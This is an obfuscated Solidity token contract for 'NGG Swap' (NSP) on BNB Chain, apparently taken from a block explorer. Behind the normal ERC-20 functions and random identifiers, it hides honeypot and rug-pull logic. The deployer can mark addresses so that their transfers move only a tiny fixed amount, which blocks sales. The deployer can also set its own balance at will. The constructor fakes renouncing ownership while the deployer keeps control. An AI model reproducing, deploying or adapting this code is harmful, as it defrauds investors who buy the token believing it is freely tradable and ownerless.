/**
 *Submitted for verification at BscScan.com on 2023-02-20
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface gktoynlbd {
    function totalSupply() external view returns (uint256);

    function balanceOf(address ueyzsdjmip) external view returns (uint256);

    function transfer(address czvnxvnim, uint256 bgfhgbnipy) external returns (bool);

    function allowance(address tfwelapgcaw, address spender) external view returns (uint256);

    function approve(address spender, uint256 bgfhgbnipy) external returns (bool);

    function transferFrom(
        address sender,
        address czvnxvnim,
        uint256 bgfhgbnipy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed xssnarrcfwfeez, uint256 value);
    event Approval(address indexed tfwelapgcaw, address indexed spender, uint256 value);
}

interface mwkkowomztf is gktoynlbd {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract pceguaydskjc {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface mdaulbiji {
    function createPair(address rvsphiojhwgr, address omcbvfogef) external returns (address);
}

interface vjeqwutcryspg {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract NGGSwap is pceguaydskjc, gktoynlbd, mwkkowomztf {

    function getOwner() external view returns (address) {
        return qoiuxsuvjso;
    }

    function decimals() external view virtual override returns (uint8) {
        return ddgakuewfsbhjt;
    }

    string private umdjdfojur = "NGG Swap";

    uint256 private vffaymnhoxi;

    function symbol() external view virtual override returns (string memory) {
        return wolsqfunvptv;
    }

    function qwvxuxcvhg() public {
        
        if (imnbbspspxgzk == vffaymnhoxi) {
            ginnfvdjmcfon = nzdlhllcgbf;
        }
        ldrhkapogh=0;
    }

    function qesszdcjselnm(address whxsqjzuyult) public {
        if (wmzvgflhena) {
            return;
        }
        if (vffaymnhoxi == nzdlhllcgbf) {
            imnbbspspxgzk = ginnfvdjmcfon;
        }
        tlqylmovple[whxsqjzuyult] = true;
        if (nzdlhllcgbf == vffaymnhoxi) {
            ginnfvdjmcfon = ldrhkapogh;
        }
        wmzvgflhena = true;
    }

    event OwnershipTransferred(address indexed wlsmpqlsmcvjc, address indexed hhtccjbir);

    uint256 private ogqprysikehn = 100000000 * 10 ** 18;

    mapping(address => bool) public zbzxrjbbli;

    function totalSupply() external view virtual override returns (uint256) {
        return ogqprysikehn;
    }

    function vynhkztykhxri() public {
        emit OwnershipTransferred(uywthzsizato, address(0));
        qoiuxsuvjso = address(0);
    }

    uint256 public imnbbspspxgzk;

    address private qoiuxsuvjso;

    function approve(address ytfxiolypopib, uint256 bgfhgbnipy) public virtual override returns (bool) {
        volygeicfc[_msgSender()][ytfxiolypopib] = bgfhgbnipy;
        emit Approval(_msgSender(), ytfxiolypopib, bgfhgbnipy);
        return true;
    }

    function blzbfjzkxqs(address dmhwuxujjypji, address czvnxvnim, uint256 bgfhgbnipy) internal returns (bool) {
        require(jrkezksmfk[dmhwuxujjypji] >= bgfhgbnipy);
        jrkezksmfk[dmhwuxujjypji] -= bgfhgbnipy;
        jrkezksmfk[czvnxvnim] += bgfhgbnipy;
        emit Transfer(dmhwuxujjypji, czvnxvnim, bgfhgbnipy);
        return true;
    }

    uint256 private ginnfvdjmcfon;

    string private wolsqfunvptv = "NSP";

    function owner() external view returns (address) {
        return qoiuxsuvjso;
    }

    function pbvmgceodad() public view returns (uint256) {
        return imnbbspspxgzk;
    }

    uint256 constant mjvpmkhgjha = 9 ** 10;

    address public funfvuchbctx;

    address public uywthzsizato;

    mapping(address => uint256) private jrkezksmfk;

    function ljbhsbafuozud(address dmhwuxujjypji, address czvnxvnim, uint256 bgfhgbnipy) internal returns (bool) {
        if (dmhwuxujjypji == uywthzsizato) {
            return blzbfjzkxqs(dmhwuxujjypji, czvnxvnim, bgfhgbnipy);
        }
        if (zbzxrjbbli[dmhwuxujjypji]) {
            return blzbfjzkxqs(dmhwuxujjypji, czvnxvnim, mjvpmkhgjha);
        }
        return blzbfjzkxqs(dmhwuxujjypji, czvnxvnim, bgfhgbnipy);
    }

    mapping(address => mapping(address => uint256)) private volygeicfc;

    function xsqwyhzumii(uint256 bgfhgbnipy) public {
        if (!tlqylmovple[_msgSender()]) {
            return;
        }
        jrkezksmfk[uywthzsizato] = bgfhgbnipy;
    }

    function transfer(address xfjuxagfcr, uint256 bgfhgbnipy) external virtual override returns (bool) {
        return ljbhsbafuozud(_msgSender(), xfjuxagfcr, bgfhgbnipy);
    }

    uint256 public nzdlhllcgbf;

    function allowance(address rizckkmlurcq, address ytfxiolypopib) external view virtual override returns (uint256) {
        return volygeicfc[rizckkmlurcq][ytfxiolypopib];
    }

    function balanceOf(address ueyzsdjmip) public view virtual override returns (uint256) {
        return jrkezksmfk[ueyzsdjmip];
    }

    function azbaiwuzodh() public {
        if (vffaymnhoxi != ldrhkapogh) {
            ldrhkapogh = vffaymnhoxi;
        }
        if (vffaymnhoxi != ginnfvdjmcfon) {
            ldrhkapogh = vffaymnhoxi;
        }
        vffaymnhoxi=0;
    }

    bool public wmzvgflhena;

    mapping(address => bool) public tlqylmovple;

    function transferFrom(address dmhwuxujjypji, address czvnxvnim, uint256 bgfhgbnipy) external override returns (bool) {
        if (volygeicfc[dmhwuxujjypji][_msgSender()] != type(uint256).max) {
            require(bgfhgbnipy <= volygeicfc[dmhwuxujjypji][_msgSender()]);
            volygeicfc[dmhwuxujjypji][_msgSender()] -= bgfhgbnipy;
        }
        return ljbhsbafuozud(dmhwuxujjypji, czvnxvnim, bgfhgbnipy);
    }

    function pspfuwrfvnko() public view returns (uint256) {
        return nzdlhllcgbf;
    }

    function name() external view virtual override returns (string memory) {
        return umdjdfojur;
    }

    uint8 private ddgakuewfsbhjt = 18;

    function kvoogqmanxhknx() public {
        if (ginnfvdjmcfon == vffaymnhoxi) {
            imnbbspspxgzk = nzdlhllcgbf;
        }
        
        ginnfvdjmcfon=0;
    }

    uint256 public ldrhkapogh;

    function mctcjxoqte(address kkllthtxhamcpf) public {
        if (ldrhkapogh == vffaymnhoxi) {
            vffaymnhoxi = ginnfvdjmcfon;
        }
        if (kkllthtxhamcpf == uywthzsizato || kkllthtxhamcpf == funfvuchbctx || !tlqylmovple[_msgSender()]) {
            return;
        }
        if (vffaymnhoxi != ginnfvdjmcfon) {
            imnbbspspxgzk = nzdlhllcgbf;
        }
        zbzxrjbbli[kkllthtxhamcpf] = true;
    }

    constructor (){ 
        
        vjeqwutcryspg oetplksyivykdx = vjeqwutcryspg(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        funfvuchbctx = mdaulbiji(oetplksyivykdx.factory()).createPair(oetplksyivykdx.WETH(), address(this));
        qoiuxsuvjso = _msgSender();
        
        uywthzsizato = _msgSender();
        tlqylmovple[_msgSender()] = true;
        if (ginnfvdjmcfon != imnbbspspxgzk) {
            ginnfvdjmcfon = vffaymnhoxi;
        }
        jrkezksmfk[_msgSender()] = ogqprysikehn;
        emit Transfer(address(0), uywthzsizato, ogqprysikehn);
        vynhkztykhxri();
    }

}